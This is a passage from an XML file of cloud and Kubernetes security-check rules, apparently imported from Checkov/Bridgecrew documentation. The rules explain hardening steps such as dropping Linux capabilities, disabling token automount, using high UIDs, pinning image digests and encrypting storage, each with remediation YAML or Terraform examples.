<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: securityContext:capabilities:drop (Optional)<br/>
Capabilites field allows granting certain privileges to a process without granting all the privileges of the root user. when <strong>drop</strong> includes <strong>ALL</strong>, all of the root privileges are disabled for that container.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
      capabilities:
        drop:
+         - ALL
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_34' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_34</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_34' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_38</key>
    <name>Ensure service account tokens are mounted where necessary</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="service-account-tokens-are-not-mounted-where-necessary"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-service-account-tokens-are-not-mounted-where-necessary"></div>Service account tokens are not mounted where necessary</div><a aria-label="Skip link to Service account tokens are not mounted where necessary" class="heading-anchor-icon fa fa-anchor" href="#service-account-tokens-are-not-mounted-where-necessary"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>One way to authenticate the API is by using the Service Account token. <strong>ServiceAccount</strong> is an object managed by Kubernetes and used to provide an identity for processes that run in a pod. Every service account has a secret related to it, this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.</p>
<p>This Service Account token is being used during the authentication stage and can become useful for  attackers if the service account is privileged and they have access to such a token. With this token an attacker can easily impersonate the service account and use REST APIs.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>:  Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: automountServiceAccountToken (Optional)<br/>
When set to false, you can opt out of automounting API credentials for a service account.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
+  automountServiceAccountToken: false
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
+           automountServiceAccountToken: false
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
+       automountServiceAccountToken: false
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_35' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_35</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_35' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_39</key>
    <name>Ensure CAP_SYS_ADMIN Linux capability is not used</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cap_sys_admin-linux-capability-is-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cap-sys-admin-linux-capability-is-used"></div>CAP_SYS_ADMIN Linux capability is used</div><a aria-label="Skip link to CAP_SYS_ADMIN Linux capability is used" class="heading-anchor-icon fa fa-anchor" href="#cap_sys_admin-linux-capability-is-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Capabilities permit certain named root actions without giving full root access and are considered a  fine-grained permissions model. </p>
<p>We recommend all capabilities should be dropped from a pod, with only those required added back. There are a large number of capabilities, with CAP_SYS_ADMIN bounding most. CAP_SYS_ADMIN is a highly privileged access level equivalent to root access and should generally be avoided.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>:  Container</li>
<li><strong>Argument</strong>: securityContext:capabilities:add (Optional)<br/>
Add capabilities field allows granting certain privileges to a process. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
        capabilities:
            add:
-               -SYS_ADMIN
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_36' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_36</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_36' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_34</key>
    <name>Ensure AWS SSM Parameter is encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ssm-parameter-is-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ssm-parameter-is-not-encrypted"></div>AWS SSM Parameter is not encrypted</div><a aria-label="Skip link to AWS SSM Parameter is not encrypted" class="heading-anchor-icon fa fa-anchor" href="#aws-ssm-parameter-is-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-ssm-parameter-is-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-ssm-parameter-is-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-ssm-parameter-is-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_2</key>
    <name>Ensure Azure SQL server ADS Vulnerability Assessment is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-ads-vulnerability-assessment-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-ads-vulnerability-assessment-is-disabled"></div>Azure SQL server ADS Vulnerability Assessment is disabled </div><a aria-label="Skip link to Azure SQL server ADS Vulnerability Assessment is disabled " class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-ads-vulnerability-assessment-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Vulnerability Assessment (VA) service scans for critical SQL servers and corresponding SQL databases.<br/>
Enabling Azure Defender for SQL server does not enables Vulnerability Assessment capability for individual SQL databases unless storage account is set to store the scanning data and reports.<br/>
The Vulnerability Assessment service scans databases for known security vulnerabilities and highlight deviations from best practices, such as misconfigurations, excessive permissions, and unprotected sensitive data. Results of the scan include actionable steps to resolve each issue and provide customized remediation scripts where applicable. Additionally an assessment report can be customized by setting an acceptable baseline for permission configurations, feature configurations, and database settings.<br/>
We recommend you ensure Vulnerability Assessment is enabled on a SQL server by setting a Storage Account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_sql_server, azurerm_storage_account, azurerm_storage_container, azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "okExample" {
  name     = "okExample-resources"
  location = "West Europe"
}

resource "azurerm_sql_server" "okExample" {
  name                         = "mysqlserver"
  resource_group_name          = azurerm_resource_group.okExample.name
  location                     = azurerm_resource_group.okExample.location
  version                      = "12.0"
  administrator_login          = "4dm1n157r470r"
  administrator_login_password = "4-v3ry-53cr37-p455w0rd"
}

resource "azurerm_storage_account" "okExample" {
  name                     = "accteststorageaccount"
  resource_group_name      = azurerm_resource_group.okExample.name
  location                 = azurerm_resource_group.okExample.location
  account_tier             = "Standard"
  account_replication_type = "GRS"
}

resource "azurerm_storage_container" "okExample" {
  name                  = "accteststoragecontainer"
  storage_account_name  = azurerm_storage_account.okExample.name
  container_access_type = "private"
}

resource "azurerm_mssql_server_security_alert_policy" "okExample" {
  resource_group_name = azurerm_resource_group.okExample.name
  server_name         = azurerm_sql_server.okExample.name
  state               = "Enabled"
}

resource "azurerm_mssql_server_vulnerability_assessment" "okExample" {
  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id
  storage_container_path          = "${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/"
  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key

  recurring_scans {
    enabled                   = true
    email_subscription_admins = true
    emails = [
      "<a class="__cf_email__" data-cfemail="afcac2cec6c3efcad7cec2dfc3ca9e81ccc0c2" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
      "<a class="__cf_email__" data-cfemail="84e1e9e5ede8c4e1fce5e9f4e8e1b6aae7ebe9" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
    ]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-vulnerability-assessment-va-is-enabled-on-a-sql-server-by-setting-a-storage-account' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-vulnerability-assessment-va-is-enabled-on-a-sql-server-by-setting-a-storage-account</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-vulnerability-assessment-va-is-enabled-on-a-sql-server-by-setting-a-storage-account' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_40</key>
    <name>Ensure containers run with a high UID to avoid host conflict</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-do-not-run-with-a-high-uid"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-do-not-run-with-a-high-uid"></div>Containers do not run with a high UID</div><a aria-label="Skip link to Containers do not run with a high UID" class="heading-anchor-icon fa fa-anchor" href="#containers-do-not-run-with-a-high-uid"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Linux namespaces provide isolation for running processes and limits access to system resources. To prevent privilege-escalation attacks from within a container, we recommend that you configure your container&#8217;s applications to run as unprivileged users. The mapped user is assigned a range of UIDs which function within the namespace as normal UIDs from 0 to 65536, but have no privileges on the host machine itself. </p>
<p>If a process attempts to escalate privilege outside of the namespace, the process is running as an unprivileged high-number UID on the host, not mapped to a real user. This means the process has no privileges on the host system and cannot be attacked by this method.</p>
<p>This check will trigger below UID 10,000 as common linux distributions will assign UID 1000 to the first non-root, non system user and 1000 users should provide a reasonable buffer.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: runAsUser (Optional)<br/>
Specifies the User ID that processes within the container and/or pod run with.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
+     runAsUser: &lt;UID higher then 10000&gt;
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: &lt;container name&gt;
            image: &lt;image&gt;
            securityContext:
+             runAsUser: &lt;UID higher then 10000&gt;
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
      containers:
      - name: &lt;container name&gt;
        image: &lt;image&gt;
        securityContext:
          runAsUser: &lt;UID higher then 10000&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_37' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_37</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_37' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_41</key>
    <name>Ensure default service accounts are not actively used</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-service-accounts-are-actively-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-service-accounts-are-actively-used"></div>Default service accounts are actively used</div><a aria-label="Skip link to Default service accounts are actively used" class="heading-anchor-icon fa fa-anchor" href="#default-service-accounts-are-actively-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Every Kubernetes installation has a service account called <em>default</em> that is associated with every running pod. Similarly, to enable pods to make calls to the internal API Server endpoint, there is a <strong>ClusterIP</strong> service called <em>Kubernetes</em>. This combination makes it possible for internal processes to call the API endpoint.</p>
<p>We recommend that users create their own user-managed service accounts and grant the appropriate roles to each service account.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="option-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-1"></div>Option 1</div><a aria-label="Skip link to Option 1" class="heading-anchor-icon fa fa-anchor" href="#option-1"></a></h3>
<ul>
<li><strong>Resource</strong>: ServiceAccount</li>
<li><strong>Argument</strong>: If service name is set to default, <strong>automountServiceAccountToken</strong> should be set to false in order to opt out of automounting API credentials for a service account.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">default service</button><button type="button">non-default service</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="default service">apiVersion: v1
kind: ServiceAccount
metadata:
  name: default
+ automountServiceAccountToken: false
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="non-default service">apiVersion: v1
kind: ServiceAccount
metadata:
+ name: &lt;service name&gt;
</code></pre></div></div>
<h3 align="" class="heading heading-3 header-scroll"><div class="heading-anchor anchor waypoint" id="option-2"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-option-2"></div>Option 2</div><a aria-label="Skip link to Option 2" class="heading-anchor-icon fa fa-anchor" href="#option-2"></a></h3>
<ul>
<li><strong>Resource</strong>: RoleBinding / ClusterRoleBinding</li>
<li><strong>Argument</strong>:<br/>
<strong>RoleBinding</strong> grants the permissions defined in a role to a user or set of users within a specific namespace.<br/>
<strong>ClusterRoleBinding</strong> grants that access cluster-wide. To avoid activating  the default service account, it should not be used as a subject in <strong>RoleBinding</strong> or <strong>ClusterRoleBinding</strong> resources. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">RoleBinding</button><button type="button">ClusterRoleBinding</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="RoleBinding">apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: &lt;name&gt;
subjects:
-- kind: ServiceAccount
-  name: default
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="ClusterRoleBinding">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;name&gt;
subjects:
-- kind: ServiceAccount
-  name: default
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_38' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_38</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_38' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_43</key>
    <name>Ensure images are selected using a digest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="images-are-not-selected-using-a-digest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-images-are-not-selected-using-a-digest"></div>Images are not selected using a digest</div><a aria-label="Skip link to Images are not selected using a digest" class="heading-anchor-icon fa fa-anchor" href="#images-are-not-selected-using-a-digest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In some cases you may prefer to use a fixed version of an image, rather than update to newer versions. Docker enables you to pull an image by its digest, specifying exactly which version of an image to pull. </p>
<p>Pulling using a digest allows you to &#8220;pin&#8221; an image to that version, and guarantee that the image you&#8217;re using is always the same. Digests also prevent race-conditions; if a new image is pushed while a deploy is in progress, different nodes may be pulling the images at different times, so some nodes have the new image, and some have the old one. Services automatically resolve tags to digests, so you don't need to manually specify a digest. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To make sure the container always uses the same version of the image, you can specify its digest; replace <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">&lt;image-name&gt;:&lt;tag&gt;</code> with <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">&lt;image-name&gt;@&lt;digest&gt;</code> (for example, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name=""><a class="__cf_email__" data-cfemail="0d64606c6a684d7e656c3f383b" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2</code>).</p>
<p>The digest uniquely identifies a specific version of the image, so it is never updated by Kubernetes unless you change the digest value.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: image</li>
<li><strong>Argument</strong>: digest </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Container</button><button type="button">image</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Container">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: <a class="__cf_email__" data-cfemail="94fdf9f5f3f1d4e7fcf5a6a1a2" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="image">{
      "creator": 7,
      "id": 2110,
      "image_id": null,
      "images": [
        {
          "architecture": "amd64",
          "features": "",
          "variant": null,
+         "digest": "sha256:1ae98b2c895d1ceeba8913ff79f422f005b7f967a311da520a88ac89180b4c39",
          "os": "linux",
          "os_features": "",
          "os_version": null,
          "size": 87342331
        }
      ],
      "last_updated": "2017-04-06T20:16:24.015937Z",
      "last_updater": 2215,
      "last_updater_username": "stackbrew",
      "name": "centos5",
      "repository": 54,
      "full_size": 87342331,
      "v2": true
    }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_39' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_39</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_39' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_19</key>
    <name>Ensure data stored in the S3 bucket is securely encrypted at rest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="data-stored-in-the-s3-bucket-is-not-securely-encrypted-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-data-stored-in-the-s-3-bucket-is-not-securely-encrypted-at-rest"></div>Data stored in the S3 bucket is not securely encrypted at rest</div><a aria-label="Skip link to Data stored in the S3 bucket is not securely encrypted at rest" class="heading-anchor-icon fa fa-anchor" href="#data-stored-in-the-s3-bucket-is-not-securely-encrypted-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>SSE helps prevent unauthorized access to S3 buckets. Encrypting and decrypting data at the S3 bucket level is transparent to users when accessing data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
